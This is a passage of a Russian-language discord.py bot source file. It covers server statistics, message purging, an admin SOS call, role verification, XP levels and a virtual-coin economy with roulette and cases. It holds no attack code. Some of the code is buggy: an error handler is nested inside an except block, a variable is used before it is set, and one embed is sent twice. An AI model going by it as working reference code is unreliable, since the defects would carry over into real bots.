    embed.set_footer(text=f'ID сервера: {guild_id}')

    embed.add_field(name='Владелец', value=owner.mention, inline=True)
    embed.add_field(name='Создан', value=created_at, inline=True)
    embed.add_field(name='ㅤ', value='ㅤ', inline=True)  # Пустое поле для выравнивания

    embed.add_field(name='Участники',
                    value=f'Всего: **{total_members}**\nЛюди: **{human_members}**\nБоты: **{bot_members}**',
                    inline=True)
    embed.add_field(name='Каналы',
                    value=f'Всего: **{total_channels}**\nТекстовые: **{text_channels}**\nГолосовые: **{voice_channels}**',
                    inline=True)
    embed.add_field(name='Роли', value=f'**{roles_count}**', inline=True)

    await ctx.send(embed=embed)

    # Добавляем новые поля с количеством по ролям
    role_counts_value = ""
    if newbie_role:
        role_counts_value += f'{newbie_role.name}: **{newbie_count}**\n'
    if verified_role:
        role_counts_value += f'{verified_role.name}: **{verified_count}**\n'
    if client_role:
        role_counts_value += f'{client_role.name}: **{client_count}**\n'
    if admin_role:
        role_counts_value += f'{admin_role.name}: **{admin_count}**\n'
    if souz_role:
        role_counts_value += f'{souz_role.name}: **{souz_count}**\n'
    if komand_role:
        role_counts_value += f'{komand_role.name}: **{komand_count}**\n'

    if role_counts_value:  # Добавляем поле, только если есть что показать
        embed.add_field(name='По ролям', value=role_counts_value,
                        inline=False)  # inline=False, чтобы занимало всю ширину

    embed.add_field(name='Уровень верификации', value=verification_level, inline=True)
    embed.add_field(name='Уровень бустов', value=f'Уровень {boost_level} ({boost_count} бустов)', inline=True)
    embed.add_field(name='ㅤ', value='ㅤ', inline=True)  # Пустое поле для выравнивания

    await ctx.send(embed=embed)

    # Логирование использования команды
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Команда "Статистика" использована',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) запросил статистику сервера.',
            color=discord.Color.light_grey(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@bot.command()
@commands.has_permissions(manage_messages=True)
async def очистить(ctx, amount: int):
    if amount <= 0:
        embed = discord.Embed(
            description='Количество сообщений для очистки должно быть больше нуля.',
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, delete_after=5)

    try:
        # Пург удаляет 'amount' сообщений + само сообщение с командой
        deleted = await ctx.channel.purge(limit=amount + 1)

        confirmation_embed = discord.Embed(
            description=f'Успешно удалено **{len(deleted) - 1}** сообщений.',  # -1, чтобы не считать сообщение команды
            color=discord.Color.green(),
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=confirmation_embed, delete_after=5)  # Сообщение удалится через 5 секунд

        # Логирование
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Очистка сообщений',
                description=f'{ctx.author.mention} (`{ctx.author.id}`) очистил **{len(deleted) - 1}** сообщений в канале {ctx.channel.mention}.',
                color=discord.Color.orange(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)

    except discord.Forbidden:
        error_embed = discord.Embed(
            description='У меня нет разрешения `Управлять сообщениями` для очистки.',
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed, delete_after=5)
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Ошибка очистки',
                description=f'Бот не смог очистить сообщения в канале {ctx.channel.mention} по запросу {ctx.author.mention} (`{ctx.author.id}`). Нет разрешения `Управлять сообщениями`.',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)
    except commands.MissingPermissions:
        # Это обрабатывается @commands.has_permissions, но можно добавить для ясности
        pass
    except Exception as e:
        error_embed = discord.Embed(
            description=f'Произошла ошибка при очистке сообщений: {e}',
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed, delete_after=5)
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Неизвестная ошибка очистки',
                description=f'Произошла ошибка при очистке сообщений в канале {ctx.channel.mention} по запросу {ctx.author.mention} (`{ctx.author.id}`): {e}',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)


@очистить.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            description='У тебя нет разрешения `Управлять сообщениями` для использования этой команды.',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=5)
    elif isinstance(error, commands.BadArgument):
        embed = discord.Embed(
            description='Укажи количество сообщений для очистки (например, `!очистить 10`).',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=5)

# Не забудь определить этот ID в своем коде.
# Пример: ADMIN_CHANNEL_ID = 123456789012345678
ADMIN_CHANNEL_ID = 1501610931262722309

@bot.command()
@commands.cooldown(1, 60, commands.BucketType.user) # Пользователь может использовать !sos раз в 60 секунд
async def sos(ctx, *, reason: str = 'Причина не указана'):
    admin_channel = ctx.guild.get_channel(ADMIN_CHANNEL_ID)

    if not admin_channel:
        embed = discord.Embed(
            description='Канал для администрации не найден. Пожалуйста, обратитесь к администратору сервера.',
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, delete_after=10)

    try:
        # Embed для администрации
        admin_embed = discord.Embed(
            title='🚨 Вызов администрации 🚨',
            description=f'Пользователь {ctx.author.mention} вызвал администрацию!',
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        admin_embed.add_field(name='Причина', value=reason, inline=False)
        admin_embed.add_field(name='Канал вызова', value=ctx.channel.mention, inline=True)
        admin_embed.add_field(name='ID Пользователя', value=ctx.author.id, inline=True)
        admin_embed.add_field(name='ID Канала', value=ctx.channel.id, inline=True)
        admin_embed.set_footer(text=f'Вызвано: {ctx.author.name}#{ctx.author.discriminator}')
        admin_embed.set_thumbnail(url=ctx.author.display_avatar.url)

        await admin_channel.send(embed=admin_embed)

        # Подтверждение для пользователя
        confirmation_embed = discord.Embed(
            description=f'{ctx.author.mention}, твой вызов администрации отправлен. Ожидай ответа.',
            color=discord.Color.green()
        )
        await ctx.send(embed=confirmation_embed, delete_after=10)

        # Логирование
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='⚠️ Вызов администрации (SOS) ⚠️', # Особое выделение в логах
                description=f'Пользователь {ctx.author.mention} (`{ctx.author.id}`) использовал команду `!sos` в канале {ctx.channel.mention} (`{ctx.channel.id}`).',
                color=discord.Color.red(), # Красный цвет для важности
                timestamp=discord.utils.utcnow()
            )
            log_embed.add_field(name='Причина', value=reason, inline=False)
            await log_channel.send(embed=log_embed)

    except discord.Forbidden:
        error_embed = discord.Embed(
            description='У меня нет разрешения отправлять сообщения в канал администрации.',
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed, delete_after=10)
        # Логирование ошибки для бота
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Ошибка при вызове SOS',
                description=f'Бот не смог отправить сообщение в канал администрации ({ADMIN_CHANNEL_ID}). Проверьте разрешения.',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)
    except Exception as e:
        error_embed = discord.Embed(
            description=f'Произошла ошибка при вызове администрации: {e}',
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed, delete_after=10)
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Неизвестная ошибка SOS',
                description=f'Произошла ошибка при обработке команды `!sos` от {ctx.author.mention} (`{ctx.author.id}`): {e}',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)

        @sos.error
        async def sos_error(ctx, error):
            if isinstance(error, commands.CommandOnCooldown):
                embed = discord.Embed(
                    description=f'{ctx.author.mention}, ты можешь использовать эту команду снова через {error.retry_after:.0f} секунд.',
                    color=discord.Color.orange()
                )
                await ctx.send(embed=embed, delete_after=10)
            elif isinstance(error, commands.MissingRequiredArgument):
                embed = discord.Embed(
                    description='Пожалуйста, укажи причину вызова администрации (например, `!sos Нужна помощь`).',
                    color=discord.Color.red()
                )
                await ctx.send(embed=embed, delete_after=10)


@bot.command()
@commands.guild_only()  # Убедиться, что команда используется только на сервере
async def вериф(ctx):
    """Выдаёт роль верифицированного пользователя и удаляет сообщения."""

    # Удаляем сообщение с вызовом команды пользователя
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        print(f"Недостаточно прав для удаления сообщения пользователя в канале {ctx.channel.name} ({ctx.channel.id})")
        # Можешь отправить сообщение об ошибке, если хочешь
        # await ctx.send("У меня нет прав для удаления сообщений!", delete_after=5)
    except discord.HTTPException as e:
        print(f"Не удалось удалить сообщение пользователя: {e}")

    # Получаем объект роли
    verified_role = ctx.guild.get_role(VERIFIED_ROLE_ID)

    if not verified_role:
        print(f"Ошибка: Роль с ID {VERIFIED_ROLE_ID} не найдена на сервере '{ctx.guild.name}'. Проверьте config.json.")
        embed = discord.Embed(
            title='❌ Ошибка верификации',
            description='Не удалось найти роль для верификации. Пожалуйста, сообщите администрации.',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=10)
        return

    # Проверяем, есть ли уже у пользователя эта роль
    if verified_role in ctx.author.roles:
        embed = discord.Embed(
            title='ℹ️ Уже верифицирован',
            description=f'{ctx.author.mention}, у тебя уже есть роль "{verified_role.name}".',
            color=discord.Color.blue(),
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=embed, delete_after=10)
        return

    try:
        # Выдаём роль пользователю
        await ctx.author.add_roles(verified_role, reason="Прошёл верификацию командой !вериф")

        embed = discord.Embed(
            title='✅ Верификация успешно пройдена!',
            description=f'{ctx.author.mention}, ты успешно прошёл верификацию и получил роль **"{verified_role.name}"**!',
            color=discord.Color.green(),
            timestamp=discord.utils.utcnow()
        )
        embed.set_footer(text='Это сообщение будет удалено через 10 секунд.')
        await ctx.send(embed=embed, delete_after=10)

        # Логирование верификации
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Участник верифицирован',
                description=f'{ctx.author.mention} (`{ctx.author.id}`) успешно прошёл верификацию.',
                color=discord.Color.green(),
                timestamp=discord.utils.utcnow()
            )
            log_embed.add_field(name='Выдана роль', value=verified_role.name, inline=True)
            await log_channel.send(embed=log_embed)

    except discord.Forbidden:
        print(f"Недостаточно прав для выдачи роли '{verified_role.name}' пользователю {ctx.author.name}")
        embed = discord.Embed(
            title='❌ Ошибка прав',
            description=f'У меня недостаточно прав для выдачи роли **"{verified_role.name}"**. Пожалуйста, проверьте мои разрешения.',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=10)
        if log_channel:
            log_embed_error = discord.Embed(
                title='Ошибка выдачи роли',
                description=f'Бот не смог выдать роль {verified_role.name} пользователю {ctx.author.mention} (`{ctx.author.id}`). Недостаточно прав.',
                color=discord.Color.dark_red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed_error)
    except Exception as e:
        print(f"Произошла неизвестная ошибка при верификации {ctx.author.name}: {e}")
        embed = discord.Embed(
            title='❌ Произошла ошибка',
            description=f'При верификации произошла неизвестная ошибка. Пожалуйста, попробуйте позже или сообщите администрации. ({e})',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=10)
        if log_channel:
            log_embed_error = discord.Embed(
                title='Неизвестная ошибка верификации',
                description=f'Произошла ошибка при верификации {ctx.author.mention} (`{ctx.author.id}`): {e}',
                color=discord.Color.dark_red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed_error)

@bot.event
async def on_ready():
    print(f'Бот {bot.user} запущен')
    load_data()
    await bot.change_presence(activity=discord.Game(name="!хелп | Server TMW"))


@bot.command()
async def ранг(ctx, member: discord.Member = None):
    target_member = member or ctx.author
    uid = str(target_member.id)
    entry = get_user_data(uid)

    current_level = entry['level']
    current_xp = entry['xp']
    xp_for_next_level = get_xp_for_next_level(current_level)

    embed = discord.Embed(
        title=f'Ранг {target_member.display_name}',
        color=discord.Color.purple()
    )
    embed.set_thumbnail(url=target_member.display_avatar.url)
    embed.add_field(name='Уровень', value=f'**{current_level}**', inline=True)
    embed.add_field(name='Опыт (XP)', value=f'**{current_xp}** / {xp_for_next_level}', inline=True)

    # Прогресс бар
    progress_percent = (current_xp / xp_for_next_level) * 100 if xp_for_next_level > 0 else 100
    progress_bar_length = 20
    filled_blocks = int(progress_percent / (100 / progress_bar_length))
    empty_blocks = progress_bar_length - filled_blocks
    progress_bar = '█' * filled_blocks + '░' * empty_blocks

    embed.add_field(name='Прогресс до следующего уровня', value=f'<code>{progress_bar} {progress_percent:.0f}%</code>',
                    inline=False)
    embed.set_footer(text=f'ID: {target_member.id}')
    embed.timestamp = discord.utils.utcnow()

    await ctx.send(embed=embed)

    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Проверка ранга',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) проверил ранг {target_member.mention}. Уровень: {current_level}, XP: {current_xp}',
            color=discord.Color.purple(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    uid = str(message.author.id)
    entry = get_user_data(uid)
    now = int(datetime.now().timestamp())

    # Проверка кулдауна для XP
    if now - entry['last_xp_gain'] >= XP_MESSAGE_COOLDOWN_SECONDS:
        entry['xp'] += XP_PER_MESSAGE
        entry['last_xp_gain'] = now

        current_level = entry['level']
        xp_needed = get_xp_for_next_level(current_level)

        # Цикл для возможного быстрого набора нескольких уровней за одно сообщение
        while entry['xp'] >= xp_needed:
            entry['level'] += 1
            entry['xp'] -= xp_needed  # Вычитаем XP, чтобы прогресс шел на следующий уровень
            new_level = entry['level']

            # Сообщение о повышении уровня
            level_embed = discord.Embed(
                title='Повышение уровня!',
                description=f'{message.author.mention}, ты достиг **{new_level} уровня**!',
                color=discord.Color.gold()
            )
            await message.channel.send(embed=level_embed, delete_after=15)

            # Логирование повышения уровня
            log_channel = message.guild.get_channel(LOG_CHANNEL_ID)
            if log_channel:
                log_embed = discord.Embed(
                    title='Повышение уровня',
                    description=f'{message.author.mention} (`{message.author.id}`) достиг {new_level} уровня.',
                    color=discord.Color.gold(),
                    timestamp=discord.utils.utcnow()
                )
                await log_channel.send(embed=log_embed)

            # Выдача роли за уровень
            if new_level in LEVEL_ROLES:
                role_id = LEVEL_ROLES[new_level]
                role = message.guild.get_role(role_id)
                if role and role not in message.author.roles:
                    # Снимаем предыдущие роли за уровни (если есть), чтобы выдавать только наивысшую
                    for lvl_role_id in LEVEL_ROLES.values():
                        lvl_role = message.guild.get_role(lvl_role_id)
                        if lvl_role and lvl_role in message.author.roles and lvl_role.id != role.id:
                            await message.author.remove_roles(lvl_role)

                    await message.author.add_roles(role)
                    role_embed = discord.Embed(
                        description=f'Тебе выдана роль {role.mention} за {new_level} уровень!',
                        color=discord.Color.dark_purple()
                    )
                    await message.channel.send(embed=role_embed, delete_after=10)
                    if log_channel:
                        log_embed = discord.Embed(
                            title='Выдана роль за уровень',
                            description=f'{message.author.mention} (`{message.author.id}`) получил роль {role.mention} (уровень {new_level}).',
                            color=discord.Color.dark_purple(),
                            timestamp=discord.utils.utcnow()
                        )
                        await log_channel.send(embed=log_embed)
            xp_needed = get_xp_for_next_level(entry['level'])  # Обновляем XP для следующего уровня

    save_data()  # Сохраняем после всех изменений XP/уровня
    await bot.process_commands(message)  # Обязательно, чтобы команды работали
@bot.command()
async def дейли(ctx):
    uid = str(ctx.author.id)
    entry = get_user_data(uid)
    now = int(datetime.now().timestamp())
    last_daily = entry.get('last_daily', 0)
    time_since = now - last_daily
    cooldown = DAILY_COOLDOWN_HOURS * 3600
    if time_since < cooldown:
        remaining = cooldown - time_since
        td = timedelta(seconds=remaining)
        hours, rem = divmod(td.seconds, 3600)
        minutes, seconds = divmod(rem, 60)
        embed = discord.Embed(
            description=f'{ctx.author.mention}, ты сможешь забрать ежедневную награду через {hours}ч {minutes}м {seconds}с.',
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed, delete_after=10)
    else:
        entry['balance'] += DAILY_REWARD
        entry['last_daily'] = now
        save_data()
        embed = discord.Embed(
            title='Ежедневная награда',
            description=f'{ctx.author.mention}, ты получил **{DAILY_REWARD} монет**! Твой баланс: **{entry["balance"]} монет**.',
            color=discord.Color.gold()
        )
        await ctx.send(embed=embed)
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Ежедневная награда',
                description=f'{ctx.author.mention} (`{ctx.author.id}`) забрал {DAILY_REWARD} монет. Баланс: {entry["balance"]}',
                color=discord.Color.green(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)


@bot.command()
async def баланс(ctx, member: discord.Member = None):
    target = member or ctx.author
    uid = str(target.id)
    entry = get_user_data(uid)
    embed = discord.Embed(
        title='Баланс',
        description=f'Баланс пользователя {target.mention}: **{entry["balance"]} монет**.',
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    await ctx.send(embed=embed)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Проверка баланса',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) проверил баланс {target.mention}. Баланс: {entry["balance"]}',
            color=discord.Color.light_grey(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@bot.command()
@commands.has_permissions(administrator=True) # Только администраторы могут использовать эту команду
async def сказать(ctx, *, text: str):
    try:
        # Удаляем сообщение с командой пользователя
        await ctx.message.delete()

        # Отправляем сообщение от лица бота
        await ctx.send(text)

        # Логирование
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Команда "сказать" использована',
                description=f'{ctx.author.mention} (`{ctx.author.id}`) отправил сообщение от имени бота в канале {ctx.channel.mention}.',
                color=discord.Color.blue(),
                timestamp=discord.utils.utcnow()
            )
            log_embed.add_field(name='Сообщение', value=text[:1024], inline=False) # Обрезаем, если текст слишком длинный для поля embed
            await log_channel.send(embed=log_embed)

    except discord.Forbidden:
        # Если у бота нет прав на удаление сообщений или отправку
        error_embed = discord.Embed(
            description='У меня нет разрешения `Управлять сообщениями` (для удаления команды) или `Отправлять сообщения` (для отправки сообщения).',
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed, delete_after=10)
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Ошибка команды "сказать"',
                description=f'Бот не смог выполнить команду `!сказать` от {ctx.author.mention} (`{ctx.author.id}`) в канале {ctx.channel.mention}. Недостаточно прав.',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)
    except Exception as e:
        # Обработка других возможных ошибок
        error_embed = discord.Embed(
            description=f'Произошла ошибка при выполнении команды: {e}',
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed, delete_after=10)
        log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title='Неизвестная ошибка команды "сказать"',
                description=f'Произошла ошибка при обработке команды `!сказать` от {ctx.author.mention} (`{ctx.author.id}`): {e}',
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed)

@сказать.error
async def сказать_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            description='У тебя нет разрешения `Администратор` для использования этой команды.',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=10)
    elif isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            description='Пожалуйста, укажи текст, который бот должен сказать (например, `!сказать Привет всем!`).',
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=10)


@bot.command()
async def перевод(ctx, member: discord.Member, amount: int):
    if amount <= 0:
        embed = discord.Embed(description='Сумма перевода должна быть больше нуля.', color=discord.Color.red())
        return await ctx.send(embed=embed, delete_after=5)
    if ctx.author.id == member.id:
        embed = discord.Embed(description='Нельзя переводить деньги самому себе.', color=discord.Color.red())
        return await ctx.send(embed=embed, delete_after=5)
    sender = get_user_data(ctx.author.id)
    if sender['balance'] < amount:
        embed = discord.Embed(description='У тебя недостаточно средств для перевода.', color=discord.Color.red())
        return await ctx.send(embed=embed, delete_after=5)
    receiver = get_user_data(member.id)
    sender['balance'] -= amount
    receiver['balance'] += amount
    save_data()
    embed = discord.Embed(
        title='Перевод выполнен',
        description=f'{ctx.author.mention} перевёл **{amount} монет** пользователю {member.mention}.',
        color=discord.Color.blue(),
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name='Твой баланс', value=f'**{sender["balance"]} монет**', inline=True)
    embed.add_field(name=f'Баланс {member.display_name}', value=f'**{receiver["balance"]} монет**', inline=True)
    await ctx.send(embed=embed)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Перевод средств',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) перевёл {amount} монет {member.mention} (`{member.id}`).',
            color=discord.Color.blue(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


# ... (код других команд, например, после команды !работа)

@bot.command()
@commands.guild_only()  # Команда доступна только на сервере
async def кейс(ctx):
    """
    Использует ключ, чтобы открыть кейс и получить награду.
    """
    uid = str(ctx.author.id)
    entry = get_user_data(uid)
    key_name = 'ключ'  # Название предмета-ключа в инвентаре

    # 1. Проверяем наличие ключа в инвентаре пользователя
    if key_name not in entry['inventory']:
        embed = discord.Embed(
            description=f'{ctx.author.mention}, у тебя нет предмета "{SHOP_ITEMS[key_name]["emoji"]} **{key_name}**" для открытия кейса. '
                        f'Купи его в магазине за **{SHOP_ITEMS[key_name]["price"]} монет**.',
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        return await ctx.send(embed=embed, delete_after=10)

    # 2. Удаляем один ключ из инвентаря пользователя
    entry['inventory'].remove(key_name)

    # 3. Определяем приз из кейса по весам
    prizes_names = list(CASE_PRIZES.keys())
    prizes_weights = [CASE_PRIZES[name]['weight'] for name in prizes_names]

    chosen_prize_name = random.choices(prizes_names, weights=prizes_weights, k=1)[0]
    chosen_prize_info = CASE_PRIZES[chosen_prize_name]

    reward_amount = random.randint(chosen_prize_info['min'], chosen_prize_info['max'])

    embed_title = 'Открытие кейса'
    log_description = f'{ctx.author.mention} (`{ctx.author.id}`) открыл кейс.'
    log_color = discord.Color.greyple()

    # 4. Обрабатываем результат и обновляем баланс
    if chosen_prize_name == 'nothing':
        embed = discord.Embed(
            title=embed_title,
            description=f'{ctx.author.mention}, {chosen_prize_info["message"]}',
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        log_description += ' Результат: пусто.'
    else:
        entry['balance'] += reward_amount
        embed = discord.Embed(
            title=embed_title,
            description=f'{ctx.author.mention}, {chosen_prize_info["message"]} Ты получил **{reward_amount} монет**!',
            color=discord.Color.green(),
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name='Твой баланс', value=f'**{entry["balance"]} монет**', inline=False)
        log_description += f' Выигрыш: {reward_amount} монет. Баланс: {entry["balance"]}.'
        log_color = discord.Color.green() if reward_amount > 0 else discord.Color.red()

    save_data()  # Сохраняем данные после всех изменений (удаление ключа, изменение баланса)

    await ctx.send(embed=embed)

    # 5. Логирование открытия кейса
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Открытие кейса',
            description=log_description,
            color=log_color,
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)

@bot.command()
async def работа(ctx):
    uid = str(ctx.author.id)
    entry = get_user_data(uid)
    now = int(datetime.now().timestamp())
    last_work_time = entry.get('last_work', 0)
    time_since_last_work = now - last_work_time
    if time_since_last_work < WORK_COOLDOWN_SECONDS:
        remaining_time = WORK_COOLDOWN_SECONDS - time_since_last_work
        td = timedelta(seconds=remaining_time)
        minutes, seconds = divmod(td.seconds, 60)
        hours, minutes = divmod(minutes, 60)
        embed = discord.Embed(
            description=f'{ctx.author.mention}, ты сможешь снова поработать через '
                        f'{hours}ч {minutes}м {seconds}с.',
            color=discord.Color.orange()
        )
        return await ctx.send(embed=embed, delete_after=10)
    reward = random.randint(WORK_REWARD_MIN, WORK_REWARD_MAX)
    entry['balance'] += reward
    entry['last_work'] = now
    save_data()
    embed = discord.Embed(
        title='Работа выполнена',
        description=f'{ctx.author.mention}, ты поработал и заработал **{reward} монет**! '
                    f'Твой баланс: **{entry["balance"]} монет**.',
        color=discord.Color.gold(),
        timestamp=discord.utils.utcnow()
    )
    await ctx.send(embed=embed)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Работа',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) заработал {reward} монет. Баланс: {entry["balance"]}',
            color=discord.Color.green(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)

# ... (код до команды рулетка)

@bot.command()
@commands.guild_only()
async def рулетка(ctx, bet_amount: int, *, bet_choice: str):
    """
    Игра в рулетку: ставьте на чётное, нечётное или конкретное число (0-36).
    Пример: !рулетка 100 чет
    Пример: !рулетка 500 17
    """
    player_uid = str(ctx.author.id)
    player_data = get_user_data(player_uid)

    # 1. Проверка суммы ставки (этот блок без изменений)
    if bet_amount < MIN_BET:
        embed = discord.Embed(
            description=f'Минимальная ставка в рулетке: **{MIN_BET} монет**.',
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, delete_after=10)

    if player_data['balance'] < bet_amount:
        embed = discord.Embed(
            description=f'У тебя недостаточно монет для такой ставки. Твой баланс: **{player_data["balance"]} монет**.',
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, delete_after=10)

    # 2. Обработка выбора ставки (ВНИМАНИЕ НА ОТСТУПЫ ЗДЕСЬ)
    normalized_bet_choice = bet_choice.lower()
    bet_type = None  # 'even', 'odd', 'number'
    bet_value = None  # Число, если ставка на число
    bet_description = "" # Инициализируем здесь

    if normalized_bet_choice in ['чет', 'чёт', 'even']:
        bet_type = 'even'
        bet_description = 'чётное число'
        payout_multiplier = 2  # Выплата 1 к 1
    elif normalized_bet_choice in ['нечет', 'нечёт', 'odd']:
        bet_type = 'odd'
        bet_description = 'нечётное число'
        payout_multiplier = 2  # Выплата 1 к 1
    else:
        try:
            bet_value = int(normalized_bet_choice)
            if 0 <= bet_value <= MAX_NUMBER:
                bet_type = 'number'
                bet_description = f'число {bet_value}'
                payout_multiplier = 36  # Выплата 35 к 1 (ставка возвращается)
            else:
                raise ValueError # Число вне диапазона
        except ValueError:
            # Если ставка не "чёт", не "нечёт" и не число, то это ошибка
            embed = discord.Embed(
                description='Неверный выбор ставки. Можно ставить на "чёт", "нечёт" или на число от 0 до 36.',
                color=discord.Color.red()
            )
            return await ctx.send(embed=embed, delete_after=10)

    # >>>>> ВНИМАНИЕ: ВЕСЬ ОСТАЛЬНОЙ КОД КОМАНДЫ РУЛЕТКА ДОЛЖЕН БЫТЬ С ТАКИМ ЖЕ ОТСТУПОМ, КАК ЭТА СТРОКА <<<<<
    # >>>>> ТО ЕСТЬ НА ОДИН УРОВЕНЬ ЛЕВЕЕ, ЧЕМ БЫЛ РАНЬШЕ, ЕСЛИ ОН БЫЛ ВНУТРИ "else:" выше <<<<<

    # 3. Запуск рулетки (случайное число)
    winning_number = random.randint(0, MAX_NUMBER)  # Включая 0 и 36

    result_message = ""
    win_amount = 0
    won = False

    # Определение цвета выпавшего числа для вывода
    number_color_text = "зелёное"
    if winning_number in RED_NUMBERS:
        number_color_text = "красное"
    elif winning_number in BLACK_NUMBERS:
        number_color_text = "чёрное"
    elif winning_number == 0:
        number_color_text = "зелёное"  # Зеро

    # 4. Определение результата
    if bet_type == 'even':
        # 0 не считается чётным или нечётным в рулетке для ставок "even/odd"
        if winning_number != 0 and winning_number % 2 == 0:
            won = True
            win_amount = bet_amount * payout_multiplier
            result_message = f'Выпало **{winning_number}** ({number_color_text}, чётное)! Ты выиграл!'
        else:
            result_message = f'Выпало **{winning_number}** ({number_color_text}, {"нечётное" if winning_number != 0 and winning_number % 2 != 0 else "зеро"})! Ты проиграл.'
    elif bet_type == 'odd':
        # 0 не считается чётным или нечётным в рулетке для ставок "even/odd"
        if winning_number != 0 and winning_number % 2 != 0:
            won = True
            win_amount = bet_amount * payout_multiplier
            result_message = f'Выпало **{winning_number}** ({number_color_text}, нечётное)! Ты выиграл!'
        else:
            result_message = f'Выпало **{winning_number}** ({number_color_text}, {"чётное" if winning_number != 0 and winning_number % 2 == 0 else "зеро"})! Ты проиграл.'
    elif bet_type == 'number':
        if winning_number == bet_value:
            won = True
            win_amount = bet_amount * payout_multiplier
            result_message = f'Выпало **{winning_number}** ({number_color_text})! Твоё число! Ты выиграл!'
        else:
            result_message = f'Выпало **{winning_number}** ({number_color_text})! Твоё число не выпало. Ты проиграл.'

        # 5. Обновление баланса
    if won:
        player_data['balance'] += (win_amount - bet_amount)  # Вычитаем ставку, если выплата включает её
        embed_color = discord.Color.green()
    else:
        player_data['balance'] -= bet_amount
        embed_color = discord.Color.red()

    save_data()  # Сохраняем обновленные данные

    # 6. Отправка результата пользователю
    embed = discord.Embed(
        title='Рулетка',
